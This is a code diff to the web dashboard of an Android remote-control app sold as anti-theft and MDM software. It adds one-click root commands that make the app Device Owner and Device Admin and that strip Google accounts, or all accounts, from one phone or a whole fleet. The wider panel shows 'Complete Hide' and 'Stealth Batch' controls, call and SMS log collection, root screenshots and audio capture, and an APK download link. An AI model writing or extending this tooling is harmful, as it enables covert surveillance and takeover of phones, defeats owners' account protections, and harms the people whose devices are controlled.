@@ -4100,11 +4100,62 @@
           <div class="mdm-tab-pane" id="paneMdmPolicies">
             <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:10px;">
               <button class="btn-ctrl btn-primary compact" data-cap="ADMIN" onclick="lockScreenCommand()"><i class="bi bi-lock-fill"></i> Lock Screen Now</button>
+              <button class="btn-ctrl btn-outline compact" data-cap="ROOT" onclick="activateDeviceAdminViaRootCommand()"><i class="bi bi-shield-check"></i> Activate Admin (Root)</button>
+              <button class="btn-ctrl btn-primary compact" data-cap="ROOT" onclick="activateDeviceOwnerViaRootCommand()"><i class="bi bi-shield-plus"></i> Set Device Owner (Root)</button>
               <button class="btn-ctrl btn-success compact" data-cap="DPC" onclick="applyPoliciesCommand()"><i class="bi bi-shield-check"></i> Enforce Baseline DPC</button>
               <button class="btn-ctrl btn-outline compact" data-cap="ADMIN" onclick="queryMdmStatusCommand()"><i class="bi bi-arrow-repeat"></i> Query MDM Status</button>
               <button class="btn-ctrl btn-outline compact" data-cap="DPC" onclick="unlockAllPoliciesCommand()"><i class="bi bi-shield-slash"></i> Clear All Policies</button>
               <button class="btn-ctrl btn-secondary compact" data-cap="DPC_OR_ROOT" onclick="rebootDeviceCommand()"><i class="bi bi-arrow-clockwise"></i> Reboot Device</button>
               <button class="btn-ctrl btn-danger-outline compact" data-cap="ADMIN" onclick="confirmRemoteWipeCommand()"><i class="bi bi-exclamation-triangle-fill"></i> Remote Wipe</button>
+            </div>
+
+            <!-- Root Device Provisioning (dpm) & Accounts Manager -->
+            <div id="rootProvisioningCard" data-cap="ROOT" style="background:#070d14; border:1px solid rgba(56,189,248,0.28); border-radius:10px; padding:10px 12px; margin-bottom:12px;">
+              <div style="display:flex; flex-wrap:wrap; justify-content:space-between; align-items:center; gap:8px; margin-bottom:8px;">
+                <div>
+                  <div style="font-size:0.84rem; font-weight:800; color:#f8fafc; display:flex; align-items:center; gap:6px;">
+                    <i class="bi bi-terminal-fill" style="color:#38bdf8;"></i>
+                    <span>Root Provisioning (<code>dpm</code>) &amp; Device Accounts Manager</span>
+                  </div>
+                  <div style="font-size:0.68rem; color:#94a3b8; margin-top:2px;">
+                    Execute <code>dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver</code>, activate Device Admin, and remove Google/other accounts remotely via Root.
+                  </div>
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:5px; align-items:center;">
+                  <span class="badge-mini warning" id="pillRootProvAdmin">Admin: --</span>
+                  <span class="badge-mini warning" id="pillRootProvOwner">Device Owner: --</span>
+                  <span class="badge-mini info" id="pillRootProvReadiness">Accounts: Not Loaded</span>
+                </div>
+              </div>
+
+              <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px;">
+                <button type="button" class="btn-ctrl btn-outline compact" onclick="activateDeviceAdminViaRootCommand()"><i class="bi bi-shield-check"></i> Activate Admin (Root)</button>
+                <button type="button" class="btn-ctrl btn-primary compact" onclick="activateDeviceOwnerViaRootCommand()"><i class="bi bi-shield-plus"></i> Set Device Owner (Root)</button>
+                <button type="button" class="btn-ctrl btn-secondary compact" onclick="fetchDeviceAccountsCommand()"><i class="bi bi-person-lines-fill"></i> Load Accounts</button>
+                <button type="button" class="btn-ctrl btn-warning compact" onclick="removeFilteredAccountsCommand('GOOGLE')"><i class="bi bi-google"></i> Remove Google Accounts</button>
+                <button type="button" class="btn-ctrl btn-danger-outline compact" onclick="removeFilteredAccountsCommand('ALL')"><i class="bi bi-person-x-fill"></i> Remove All Accounts</button>
+                <button type="button" class="btn-ctrl btn-outline compact" id="btnRootProvSoftReboot" style="display:none; border-color:#fbbf24; color:#fbbf24;" onclick="softRebootForAccountsCommand()"><i class="bi bi-lightning-fill"></i> Soft Reboot Now</button>
+                <button type="button" class="btn-ctrl btn-outline compact" onclick="switchRailPage('terminal')"><i class="bi bi-terminal"></i> Root Terminal</button>
+              </div>
+
+              <div id="rootProvResultBanner" style="display:none; font-size:0.7rem; padding:7px 9px; border-radius:7px; margin-bottom:8px; background:rgba(56,189,248,0.1); border:1px solid rgba(56,189,248,0.3); color:#e2e8f0; white-space:pre-wrap; word-break:break-word;"></div>
+
+              <div class="mdm-table-scroll" style="max-height:170px; margin-bottom:6px;">
+                <table class="perm-table" style="margin:0;">
+                  <thead>
+                    <tr>
+                      <th>Account Name</th>
+                      <th>Provider / Type</th>
+                      <th>User</th>
+                      <th style="text-align:right;">Action</th>
+                    </tr>
+                  </thead>
+                  <tbody id="deviceAccountsTableBody">
+                    <tr><td colspan="4" style="text-align:center; color:#94a3b8; padding:10px;">Click "Load Accounts" to inspect Google &amp; app accounts on this rooted device.</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <div id="deviceUsersListBox" style="display:none; font-size:0.68rem; color:#cbd5e1; margin-top:6px;"></div>
             </div>
 
             <div id="dpcPolicyGroupsContainer" data-cap="DPC">
@@ -4495,10 +4546,13 @@
               <button class="btn-ctrl compact btn-outline" onclick="runPresetRootCommand('iptables -L -n')">iptables</button>
               <button class="btn-ctrl compact btn-outline" onclick="runPresetRootCommand('ss -tulnp')">sockets</button>
               <button class="btn-ctrl compact btn-outline" onclick="runPresetRootCommand('getprop ro.build.version.release')">android ver</button>
+              <button class="btn-ctrl compact btn-success" onclick="runPresetRootCommand('dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver')" title="Provision SIM Tool as Device Owner on rooted phone">dpm set-device-owner</button>
+              <button class="btn-ctrl compact btn-outline" onclick="runPresetRootCommand('dpm set-active-admin com.simtool/.CompanyDeviceAdminReceiver')" title="Activate Company Device Admin via root">dpm set-active-admin</button>
+              <button class="btn-ctrl compact btn-outline" onclick="runPresetRootCommand('dumpsys account | grep &quot;Account {&quot;')" title="List registered accounts via dumpsys">list accounts</button>
             </div>
 
             <div class="control-row" style="margin-bottom:8px;">
-              <input type="text" id="inpRootCommand" class="form-control compact" placeholder="Enter root command (e.g. ps -A, getenforce, cat /proc/meminfo)..." onkeydown="handleRootTerminalKeyDown(event)">
+              <input type="text" id="inpRootCommand" class="form-control compact" placeholder="Enter root cmd or paste adb shell dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver..." onkeydown="handleRootTerminalKeyDown(event)">
               <button class="btn-ctrl btn-primary" style="width:auto; padding:0 14px;" onclick="executeRootTerminalCommand()">
                 <i class="bi bi-play-fill"></i> Execute
               </button>
@@ -4928,6 +4982,10 @@
                 <div class="card-title" style="font-size:0.84rem;"><i class="bi bi-shield-check" style="color:#a855f7;"></i> Enterprise Policy &amp; Stealth Batch</div>
               </div>
               <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px;">
+                <button type="button" class="btn-ctrl btn-outline compact" data-cap="ROOT" onclick="activateDeviceAdminViaRootCommand()"><i class="bi bi-shield-check"></i> Activate Admin (Root)</button>
+                <button type="button" class="btn-ctrl btn-primary compact" data-cap="ROOT" onclick="activateDeviceOwnerViaRootCommand()"><i class="bi bi-shield-plus"></i> Set Device Owner (Root)</button>
+                <button type="button" class="btn-ctrl btn-warning compact" data-cap="ROOT" onclick="removeFilteredAccountsCommand('GOOGLE')"><i class="bi bi-google"></i> Remove Google Accts</button>
+                <button type="button" class="btn-ctrl btn-outline compact" data-cap="ROOT" onclick="openRootAccountsManager()"><i class="bi bi-person-lines-fill"></i> Manage Accounts</button>
                 <button type="button" class="btn-ctrl btn-success compact" data-cap="DPC" onclick="dispatchCentralCommand('APPLY_POLICIES', {}, true)"><i class="bi bi-shield-lock"></i> Enforce DPC</button>
                 <button type="button" class="btn-ctrl btn-outline compact" data-cap="DPC_OR_ROOT" onclick="dispatchCentralCommand('GRANT_PERMISSIONS', {})"><i class="bi bi-check2-all"></i> Grant Perms</button>
                 <button type="button" class="btn-ctrl btn-warning compact" onclick="dispatchCentralCommand('COMPLETE_HIDE', {}, true)"><i class="bi bi-eye-slash"></i> Complete Hide</button>
@@ -5868,6 +5926,15 @@
               <button type="button" class="btn-ctrl btn-danger compact" onclick="rebootDeviceCommand()" title="Reboot Device"><i class="bi bi-arrow-clockwise"></i></button>
             </div>
           </div>
+          <div style="background:rgba(16,185,129,0.06); border:1px solid rgba(52,211,153,0.28); border-radius:8px; padding:8px; display:flex; flex-direction:column; gap:5px;" data-cap="ROOT">
+            <div style="font-size:0.66rem; font-weight:800; color:#34d399; letter-spacing:0.3px;">ROOT ADMIN / DEVICE OWNER &amp; ACCOUNTS</div>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:4px;">
+              <button type="button" class="btn-ctrl btn-outline compact" style="font-size:0.64rem;" onclick="activateDeviceAdminViaRootCommand()"><i class="bi bi-shield-check"></i> Activate Admin</button>
+              <button type="button" class="btn-ctrl btn-primary compact" style="font-size:0.64rem;" onclick="activateDeviceOwnerViaRootCommand()"><i class="bi bi-shield-plus"></i> Set Device Owner</button>
+              <button type="button" class="btn-ctrl btn-warning compact" style="font-size:0.64rem;" onclick="removeFilteredAccountsCommand('GOOGLE')"><i class="bi bi-google"></i> Del Google Accts</button>
+              <button type="button" class="btn-ctrl btn-outline compact" style="font-size:0.64rem;" onclick="openRootAccountsManager()"><i class="bi bi-person-lines-fill"></i> Accounts Mgr</button>
+            </div>
+          </div>
         </div>
 
         <!-- TAB 3: ACTIONS TAKEN TIMELINE -->
@@ -6421,6 +6488,26 @@
         <div class="settings-section-title"><i class="bi bi-cpu"></i> Enterprise Device Owner &amp; Admin Setup</div>
         <div class="card-panel" style="padding:14px; background:#070b0e; margin-bottom:14px; border:1px solid var(--border-color); border-radius:10px;">
           
+          <div style="font-size:0.78rem; color:#34d399; font-weight:700; margin-bottom:4px;"><i class="bi bi-terminal-fill"></i> Method 0: Rooted Device &mdash; 1-Click Remote Execution from Dashboard</div>
+          <div style="font-size:0.7rem; color:var(--text-muted); margin-bottom:6px;">
+            On a rooted device (<code>su</code>), run Device Admin / Device Owner provisioning and remove blocking Google accounts directly from this dashboard without USB/ADB:
+          </div>
+          <code style="display:block; background:#111b21; padding:8px; border-radius:6px; color:#34d399; font-size:0.7rem; word-break:break-all; margin-bottom:8px;">
+            dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver
+          </code>
+          <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px;">
+            <button type="button" class="btn-action" style="background:rgba(56,189,248,0.2); border-color:#38bdf8; color:#38bdf8; font-weight:700;" onclick="activateDeviceOwnerViaRootCommand()">
+              <i class="bi bi-shield-plus"></i> Execute Set Device Owner (Root)
+            </button>
+            <button type="button" class="btn-action" style="background:rgba(52,211,153,0.15); border-color:#34d399; color:#34d399;" onclick="activateDeviceAdminViaRootCommand()">
+              <i class="bi bi-shield-check"></i> Activate Device Admin (Root)
+            </button>
+            <button type="button" class="btn-action" style="background:rgba(245,158,11,0.15); border-color:#f59e0b; color:#fbbf24;" onclick="closeGpsSettings(); openRootAccountsManager();">
+              <i class="bi bi-person-lines-fill"></i> Manage / Remove Google Accounts
+            </button>
+          </div>
+          <div id="settingsModalRootDpmStatus" style="display:none; font-size:0.7rem; padding:7px 9px; border-radius:7px; margin-bottom:12px; background:rgba(56,189,248,0.1); border:1px solid rgba(56,189,248,0.3); color:#e2e8f0; white-space:pre-wrap; word-break:break-word;"></div>
+
           <div style="font-size:0.78rem; color:#38bdf8; font-weight:700; margin-bottom:4px;"><i class="bi bi-phone"></i> Method 1: Local ADB on Phone (NO LAPTOP REQUIRED)</div>
           <div style="font-size:0.7rem; color:var(--text-muted); margin-bottom:6px;">
             Works on Android 11+ directly on the phone screen without any computer:
@@ -6468,13 +6555,13 @@
         </div>
 
         <!-- 8. Native Android Release APK Download -->
-        <div class="settings-section-title"><i class="bi bi-android2"></i> Native Android Release APK (v4.3.8)</div>
+        <div class="settings-section-title"><i class="bi bi-android2"></i> Native Android Release APK (v4.3.9)</div>
         <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
           <div style="font-weight: 700; color: #fff; font-size: 0.85rem; margin-bottom: 4px;">Download Native Android APK (Enterprise Anti-Theft &amp; MDM DPC)</div>
           <div style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 10px;">100% Pure Android Native Java (Device Owner DPC + Release DPC, Complete Hide/Unhide, 3-Mode Operation, Device Settings &amp; User Locks, Calls &amp; SMS, Version Control Upgrade/Downgrade, Root Suite)</div>
           <div style="display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
-            <a href="https://nano-micro-node.github.io/iot-devices/simtool_4.3.8.apk" target="_blank" download="simtool_4.3.8.apk" style="display: inline-flex; align-items: center; gap: 8px; background: #38bdf8; color: #090d16; font-weight: 700; font-size: 0.82rem; padding: 8px 14px; border-radius: 6px; text-decoration: none;">
-              <i class="bi bi-download"></i> Download simtool_4.3.8.apk (v4.3.8 Release)
+            <a href="https://nano-micro-node.github.io/iot-devices/simtool_4.3.9.apk" target="_blank" download="simtool_4.3.9.apk" style="display: inline-flex; align-items: center; gap: 8px; background: #38bdf8; color: #090d16; font-weight: 700; font-size: 0.82rem; padding: 8px 14px; border-radius: 6px; text-decoration: none;">
+              <i class="bi bi-download"></i> Download simtool_4.3.9.apk (v4.3.9 Release)
             </a>
             <a href="https://nano-micro-node.github.io/iot-devices/simtool.apk" target="_blank" download="simtool.apk" style="display: inline-flex; align-items: center; gap: 6px; background: rgba(52,211,153,0.12); border:1px solid rgba(52,211,153,0.35); color: #34d399; font-weight: 600; font-size: 0.78rem; padding: 8px 12px; border-radius: 6px; text-decoration: none;">
               <i class="bi bi-link-45deg"></i> simtool.apk (Latest)
@@ -6619,6 +6706,8 @@
     if (typeof commsCachedCallLogs !== 'undefined') Object.keys(commsCachedCallLogs).forEach(k => delete commsCachedCallLogs[k]);
     if (typeof commsCachedSmsLogs !== 'undefined') Object.keys(commsCachedSmsLogs).forEach(k => delete commsCachedSmsLogs[k]);
     if (typeof commsLastStatusByDevice !== 'undefined') Object.keys(commsLastStatusByDevice).forEach(k => delete commsLastStatusByDevice[k]);
+    if (typeof cachedDeviceAccounts !== 'undefined') cachedDeviceAccounts = {};
+    if (typeof rootProvBannerState !== 'undefined') rootProvBannerState = {};
     currentTargetImei = '';
     lastCoords = null;
     if (typeof appCfgDirtyFields !== 'undefined') appCfgDirtyFields.clear();
@@ -8688,6 +8777,8 @@
         renderCommsControlPage();
       } else if (meta.customPane === 'panePageTelecom' && typeof renderTelecomControlPage === 'function') {
         renderTelecomControlPage();
+      } else if (activeRailPage === 'policies' && typeof renderRootProvisioningCard === 'function') {
+        renderRootProvisioningCard();
       }
     }
 
@@ -8790,6 +8881,9 @@
       if (pane) pane.style.display = (k === activeRightSidebarTab ? 'flex' : 'none');
     });
     renderRightControlSidebar();
+    if (typeof applyDeviceCapabilityFiltering === 'function') {
+      applyDeviceCapabilityFiltering(currentTargetImei ? devicesFleet[currentTargetImei] : null);
+    }
   }
 
   let rightControlsBuilt = false;
@@ -8983,6 +9077,9 @@
           <button type="button" class="btn-ctrl btn-outline compact" onclick="groupQuickCommand('SET_INTERVAL', { seconds: 0 })">Sleep On-Demand</button>
           <button type="button" class="btn-ctrl btn-success compact" onclick="groupQuickCommand('APPLY_POLICIES')">Enforce DPC</button>
           <button type="button" class="btn-ctrl btn-outline compact" onclick="groupQuickCommand('GET_MDM_STATUS')">Query MDM All</button>
+          <button type="button" class="btn-ctrl btn-outline compact" data-cap="ROOT" onclick="groupQuickCommand('SET_DEVICE_ADMIN_ROOT')">Activate Admin (Root)</button>
+          <button type="button" class="btn-ctrl btn-primary compact" data-cap="ROOT" onclick="groupQuickCommand('SET_DEVICE_OWNER')">Set Device Owner (Root)</button>
+          <button type="button" class="btn-ctrl btn-warning compact" data-cap="ROOT" onclick="removeFilteredAccountsGroupCommand('GOOGLE')">Remove Google Accts</button>
           <button type="button" class="btn-ctrl btn-danger compact" onclick="groupQuickCommand('TRIGGER_ALARM', { duration: 30 })">Siren 30s</button>
           <button type="button" class="btn-ctrl btn-warning compact" onclick="groupQuickCommand('STOP_ALARM')">Stop Sirens</button>
         </div>
@@ -9778,10 +9875,37 @@
         dev.mdm.isDeviceOwner = false;
         dev.mdm.isDeviceAdmin = false;
       }
+      dev.operationMode = dev.isRooted ? 'ROOT_ONLY' : 'UNPROVISIONED';
       dev.uninstallBlocked = false;
       dev.factoryResetBlocked = false;
       dev.isLauncherHidden = false;
       dev.isCompleteHidden = false;
+    } else if (action === 'SET_DEVICE_OWNER' || action === 'ACTIVATE_DEVICE_OWNER' || action === 'PROVISION_DPC') {
+      if (data.isDeviceOwner !== undefined) dev.isDeviceOwner = !!data.isDeviceOwner;
+      else if (isSuccess) dev.isDeviceOwner = true;
+      if (data.isDeviceAdmin !== undefined) dev.isDeviceAdmin = !!data.isDeviceAdmin;
+      else if (isSuccess) dev.isDeviceAdmin = true;
+      if (data.operationMode) dev.operationMode = data.operationMode;
+      else if (isSuccess) dev.operationMode = dev.isRooted ? 'ROOT_HYBRID' : 'NON_ROOT_DPC';
+      if (!dev.mdm) dev.mdm = {};
+      dev.mdm.isDeviceOwner = !!dev.isDeviceOwner;
+      dev.mdm.isDeviceAdmin = !!dev.isDeviceAdmin;
+    } else if (action === 'SET_DEVICE_ADMIN_ROOT' || action === 'ACTIVATE_DEVICE_ADMIN') {
+      if (data.isDeviceAdmin !== undefined) dev.isDeviceAdmin = !!data.isDeviceAdmin;
+      else if (isSuccess) dev.isDeviceAdmin = true;
+      if (data.isDeviceOwner !== undefined) dev.isDeviceOwner = !!data.isDeviceOwner;
+      if (data.operationMode) dev.operationMode = data.operationMode;
+      if (!dev.mdm) dev.mdm = {};
+      dev.mdm.isDeviceAdmin = !!dev.isDeviceAdmin;
+      if (dev.isDeviceOwner !== undefined) dev.mdm.isDeviceOwner = !!dev.isDeviceOwner;
+    } else if (action === 'ROOT_EXEC') {
+      if (data.isDeviceAdmin !== undefined) dev.isDeviceAdmin = !!data.isDeviceAdmin;
+      if (data.isDeviceOwner !== undefined) dev.isDeviceOwner = !!data.isDeviceOwner;
+      if (data.operationMode) dev.operationMode = data.operationMode;
+      else if (data.isDeviceOwner === true) dev.operationMode = dev.isRooted ? 'ROOT_HYBRID' : 'NON_ROOT_DPC';
+      if (!dev.mdm) dev.mdm = {};
+      if (data.isDeviceOwner !== undefined) dev.mdm.isDeviceOwner = !!data.isDeviceOwner;
+      if (data.isDeviceAdmin !== undefined) dev.mdm.isDeviceAdmin = !!data.isDeviceAdmin;
     } else if (action === 'SET_LOCK_SCREEN_MESSAGE' && isSuccess) {
       dev.isLockScreenMessageActive = true;
     } else if (action === 'CLEAR_LOCK_SCREEN_MESSAGE' && isSuccess) {
@@ -10016,6 +10140,43 @@
     // Special routing for Dual-Mode MDM, Root, Media & Structured Responses
     if (action === 'ROOT_EXEC') {
       appendRootTerminalOutput(imei, data);
+      if (data.executedCommand && (String(data.executedCommand).indexOf('dpm') >= 0 || String(data.executedCommand).indexOf('device_policy') >= 0)) {
+        const summary = [data.stdout, data.stderr].filter(Boolean).join('\n') || msg || status;
+        rootProvBannerState[imei] = { ok: isSuccess, text: summary, rebootRequired: false };
+      }
+    } else if (action === 'SET_DEVICE_OWNER' || action === 'ACTIVATE_DEVICE_OWNER' || action === 'PROVISION_DPC' || action === 'SET_DEVICE_ADMIN_ROOT' || action === 'ACTIVATE_DEVICE_ADMIN') {
+      const cmdLabel = data.commandExecuted || action;
+      const lines = [];
+      lines.push((isSuccess ? '✓ ' : '✕ ') + cmdLabel + ' -> ' + (msg || status));
+      if (data.stdout) lines.push(data.stdout);
+      if (data.stderr) lines.push('STDERR: ' + data.stderr);
+      if (data.hint) lines.push('Hint: ' + data.hint);
+      rootProvBannerState[imei] = { ok: isSuccess, text: lines.join('\n'), rebootRequired: false };
+      if (data.stdout || data.stderr) {
+        appendRootTerminalOutput(imei, {
+          command: cmdLabel,
+          exitCode: data.exitCode,
+          stdout: data.stdout || '',
+          stderr: [data.stderr, data.hint].filter(Boolean).join('\n')
+        });
+      }
+    } else if (action === 'GET_DEVICE_ACCOUNTS' || action === 'REMOVE_DEVICE_ACCOUNT' || action === 'REMOVE_GOOGLE_ACCOUNTS' || action === 'REMOVE_ALL_ACCOUNTS' || action === 'REMOVE_DEVICE_ACCOUNTS' || action === 'REMOVE_DEVICE_USER') {
+      if (Array.isArray(data.accounts) || Array.isArray(data.users)) {
+        cachedDeviceAccounts[imei] = {
+          accounts: Array.isArray(data.accounts) ? data.accounts : [],
+          users: Array.isArray(data.users) ? data.users : [],
+          canSetDeviceOwnerNow: !!data.canSetDeviceOwnerNow,
+          blockingReason: data.blockingReason || '',
+          fetchedAt: Date.now()
+        };
+      }
+      const bannerTxt = data.detail || data.message || msg || status;
+      rootProvBannerState[imei] = {
+        ok: isSuccess && !data.rebootRequired,
+        warn: !!data.rebootRequired,
+        text: bannerTxt,
+        rebootRequired: !!data.rebootRequired
+      };
     } else if (action === 'ROOT_SCREENSHOT' || action === 'ROOT_AUDIO_CLIP') {
       handleBinaryChunkAck(imei, action, data);
     } else if (action === 'GET_PACKAGES' && Array.isArray(data.packages)) {
@@ -10816,6 +10977,9 @@
       return alert('Select one or more devices in the left sidebar first.');
     }
     if (action === 'APPLY_POLICIES' && !confirm(`Enforce DPC lockdown on ${targets.length} selected device(s)?`)) {
+      return;
+    }
+    if (action === 'SET_DEVICE_OWNER' && !confirm(`Execute "dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver" via Root on ${targets.length} selected device(s)?`)) {
       return;
     }
     targets.forEach(id => publishRemoteCommand(action, params, id));
@@ -12400,6 +12564,256 @@
     }
   }
 
+  let cachedDeviceAccounts = {};
+  let rootProvBannerState = {};
+
+  function ensureRootTargetDeviceCheck() {
+    const isGroup = (typeof applyControlsToGroup !== 'undefined' && applyControlsToGroup && selectedFleetDevices.size > 0);
+    if (!isGroup && !currentTargetImei) {
+      alert('Select a target rooted device first.');
+      return false;
+    }
+    if (!isGroup && currentTargetImei) {
+      const dev = devicesFleet[currentTargetImei];
+      if (dev && !dev.isRooted) {
+        alert('This device is NOT rooted (su unavailable). Root provisioning and account removal require a rooted device.');
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function activateDeviceAdminViaRootCommand() {
+    if (!ensureRootTargetDeviceCheck()) return;
+    dispatchTargetOrGroupCommand('SET_DEVICE_ADMIN_ROOT', { requestId: 'dpm_admin_' + Date.now() });
+    logTerminal('cmd', '[ROOT DPM] Executing dpm set-active-admin com.simtool/.CompanyDeviceAdminReceiver');
+  }
+
+  function activateDeviceOwnerViaRootCommand() {
+    if (!ensureRootTargetDeviceCheck()) return;
+    const isGroup = (typeof applyControlsToGroup !== 'undefined' && applyControlsToGroup && selectedFleetDevices.size > 0);
+    const scopeTxt = isGroup ? `${selectedFleetDevices.size} selected device(s)` : `device ${currentTargetImei}`;
+    if (!confirm(`Execute "dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver" via Root on ${scopeTxt}?\n\nNote: Android requires 0 accounts and 1 primary user on the device for Device Owner provisioning.`)) {
+      return;
+    }
+    dispatchTargetOrGroupCommand('SET_DEVICE_OWNER', { applyPolicies: false, requestId: 'dpm_owner_' + Date.now() });
+    logTerminal('cmd', '[ROOT DPM] Executing dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver');
+  }
+
+  function fetchDeviceAccountsCommand() {
+    if (!currentTargetImei) {
+      alert('Select a target rooted device first.');
+      return;
+    }
+    const dev = devicesFleet[currentTargetImei];
+    if (dev && !dev.isRooted) {
+      alert('This device is not rooted.');
+      return;
+    }
+    publishRemoteCommand('GET_DEVICE_ACCOUNTS', { requestId: 'accts_' + Date.now() });
+  }
+
+  function removeDeviceAccountByIndex(idx) {
+    if (!currentTargetImei) return;
+    const inv = cachedDeviceAccounts[currentTargetImei];
+    if (!inv || !Array.isArray(inv.accounts) || !inv.accounts[idx]) return;
+    const acc = inv.accounts[idx];
+    if (!confirm(`Remove account "${acc.name}" (${acc.typeLabel || acc.type}, user ${acc.userId}) from rooted device ${currentTargetImei}?`)) {
+      return;
+    }
+    publishRemoteCommand('REMOVE_DEVICE_ACCOUNT', {
+      name: acc.name,
+      type: acc.type,
+      userId: acc.userId || 0,
+      requestId: 'rm_acct_' + Date.now()
+    });
+  }
+
+  function removeFilteredAccountsCommand(filterType) {
+    if (!ensureRootTargetDeviceCheck()) return;
+    const f = String(filterType || 'GOOGLE').toUpperCase();
+    const label = (f === 'ALL') ? 'ALL accounts (Google, WhatsApp, Work, etc.)' : 'all Google accounts (com.google)';
+    const isGroup = (typeof applyControlsToGroup !== 'undefined' && applyControlsToGroup && selectedFleetDevices.size > 0);
+    const scopeTxt = isGroup ? `${selectedFleetDevices.size} selected device(s)` : `device ${currentTargetImei}`;
+    if (!confirm(`Remove ${label} on rooted ${scopeTxt}?\n\nThis enables running "dpm set-device-owner com.simtool/.CompanyDeviceAdminReceiver" without manual account removal on the phone.`)) {
+      return;
+    }
+    const actionName = (f === 'ALL') ? 'REMOVE_ALL_ACCOUNTS' : 'REMOVE_GOOGLE_ACCOUNTS';
+    dispatchTargetOrGroupCommand(actionName, { filterType: f, requestId: 'rm_accts_' + Date.now() });
+  }
+
+  function removeFilteredAccountsGroupCommand(filterType) {
+    const targets = selectedFleetDevices.size > 0 ? Array.from(selectedFleetDevices) : (currentTargetImei ? [currentTargetImei] : []);
+    if (targets.length === 0) return alert('No devices selected.');
+    const f = String(filterType || 'GOOGLE').toUpperCase();
+    const label = (f === 'ALL') ? 'ALL accounts' : 'all Google accounts';
+    if (!confirm(`Remove ${label} on ${targets.length} device(s)?`)) return;
+    const actionName = (f === 'ALL') ? 'REMOVE_ALL_ACCOUNTS' : 'REMOVE_GOOGLE_ACCOUNTS';
+    targets.forEach(id => publishRemoteCommand(actionName, { filterType: f, requestId: 'grp_rm_accts_' + Date.now() }, id));
+  }
+
+  function removeSecondaryUserCommand(userId) {
+    if (!currentTargetImei) return;
+    if (Number(userId) <= 0) {
+      alert('Cannot remove primary user (0).');
+      return;
+    }
+    if (!confirm(`Remove secondary Android user/profile (ID ${userId}) from device ${currentTargetImei}? This deletes data inside that secondary profile.`)) {
+      return;
+    }
+    publishRemoteCommand('REMOVE_DEVICE_USER', { userId: Number(userId), requestId: 'rm_usr_' + Date.now() });
+  }
+
+  function softRebootForAccountsCommand() {
+    if (!currentTargetImei) return;
+    if (!confirm(`Soft Reboot (restart Zygote/system_server) on ${currentTargetImei} to flush Android AccountManager memory cache?`)) return;
+    publishRemoteCommand('POWER_CONTROL', { target: 'SOFT_REBOOT' });
+  }
+
+  function openRootAccountsManager() {
+    const dev = currentTargetImei ? devicesFleet[currentTargetImei] : null;
+    if (dev && !dev.isRooted) {
+      alert('Rooted device required (su unavailable on current target).');
+      return;
+    }
+    if (dev && dev.isRooted && strictCapabilityFilter && resolveDeviceAppMode(dev) !== 'ROOT_FULL') {
+      const curMode = resolveDeviceAppMode(dev);
+      if (!confirm(`Root Provisioning & Accounts Manager requires Mode 3 (Root Full Control). Device ${currentTargetImei} is currently in ${curMode}.\n\nSwitch to Mode 3 (ROOT_FULL) now?`)) {
+        return;
+      }
+      publishRemoteCommand('SET_APP_MODE', { mode: 'ROOT_FULL' });
+      dev.appMode = 'ROOT_FULL';
+      if (!dev.features) dev.features = {};
+      dev.features.appMode = 'ROOT_FULL';
+      applyDeviceCapabilityFiltering(dev);
+    }
+    switchRailPage('policies');
+    const card = document.getElementById('rootProvisioningCard');
+    if (card && typeof card.scrollIntoView === 'function') {
+      setTimeout(() => card.scrollIntoView({ behavior: 'smooth', block: 'start' }), 60);
+    }
+    if (currentTargetImei && devicesFleet[currentTargetImei] && devicesFleet[currentTargetImei].isRooted) {
+      fetchDeviceAccountsCommand();
+    }
+  }
+
+  function renderRootProvisioningCard() {
+    const dev = currentTargetImei ? devicesFleet[currentTargetImei] : null;
+    const adminPill = document.getElementById('pillRootProvAdmin');
+    const ownerPill = document.getElementById('pillRootProvOwner');
+    const readyPill = document.getElementById('pillRootProvReadiness');
+    const bannerEl = document.getElementById('rootProvResultBanner');
+    const softBtn = document.getElementById('btnRootProvSoftReboot');
+    const tbody = document.getElementById('deviceAccountsTableBody');
+    const usersBox = document.getElementById('deviceUsersListBox');
+
+    if (adminPill) {
+      const isAdm = !!(dev && (dev.isDeviceAdmin || dev.isDeviceOwner));
+      adminPill.className = `badge-mini ${isAdm ? 'success' : 'warning'}`;
+      adminPill.textContent = isAdm ? 'Admin: ACTIVE' : 'Admin: INACTIVE';
+    }
+    if (ownerPill) {
+      const isOwn = !!(dev && dev.isDeviceOwner);
+      ownerPill.className = `badge-mini ${isOwn ? 'success' : 'warning'}`;
+      ownerPill.textContent = isOwn ? 'Device Owner: ACTIVE' : 'Device Owner: PENDING';
+    }
+
+    const inv = currentTargetImei ? cachedDeviceAccounts[currentTargetImei] : null;
+    if (readyPill) {
+      if (dev && dev.isDeviceOwner) {
+        readyPill.className = 'badge-mini success';
+        readyPill.textContent = 'DPC Provisioned';
+      } else if (!inv) {
+        readyPill.className = 'badge-mini info';
+        readyPill.textContent = 'Accounts: Click Load';
+      } else if (inv.canSetDeviceOwnerNow) {
+        readyPill.className = 'badge-mini success';
+        readyPill.textContent = 'Ready for dpm (0 Accounts)';
+      } else {
+        readyPill.className = 'badge-mini danger';
+        readyPill.textContent = `Blocked (${inv.accounts.length} Accts)`;
+      }
+    }
+
+    const bState = currentTargetImei ? rootProvBannerState[currentTargetImei] : null;
+    const modalBannerEl = document.getElementById('settingsModalRootDpmStatus');
+    [bannerEl, modalBannerEl].forEach(el => {
+      if (!el) return;
+      if (bState && bState.text) {
+        el.style.display = 'block';
+        if (bState.warn) {
+          el.style.background = 'rgba(245, 158, 11, 0.14)';
